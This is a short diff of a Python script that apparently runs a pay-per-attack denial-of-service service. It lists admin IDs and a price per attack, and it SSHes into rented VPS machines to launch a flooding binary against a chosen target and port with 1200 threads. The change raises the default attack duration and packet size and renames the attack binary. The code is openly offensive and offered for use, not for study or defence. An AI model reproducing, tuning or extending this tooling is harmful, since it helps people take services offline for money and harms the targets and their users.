@@ -14,8 +14,8 @@ ADMIN_IDS = [7962308718]  # 🔥 Replace with your Admin IDs
 CONFIG_FILE = "config.json"
 
 # Global variables for configuration
-DEFAULT_TIME_DURATION = 120  # Default attack duration in seconds
-DEFAULT_PACKET_SIZE = 999    # Default packet size
+DEFAULT_TIME_DURATION = 240  # Default attack duration in seconds
+DEFAULT_PACKET_SIZE = 1020    # Default packet size
 DEFAULT_THREADS = 1200       # Default number of threads
 PRICE_PER_ATTACK = 10        # Price per attack in USD
 DISCOUNT_RATE = 0.1          # 10% discount rate
@@ -247,7 +247,7 @@ def execute_attack(vps, target, port, duration, chat_id):
     """Execute an attack on the target using the selected VPS."""
     global TOTAL_PACKET_SIZE
     ip, user, password = vps["ip"], vps["user"], vps["password"]
-    attack_command = f"./raja {target} {port} {duration} {DEFAULT_PACKET_SIZE} {DEFAULT_THREADS}"
+    attack_command = f"./Rahul {target} {port} {duration} {DEFAULT_PACKET_SIZE} {DEFAULT_THREADS}"
 
     try:
         ssh = paramiko.SSHClient()
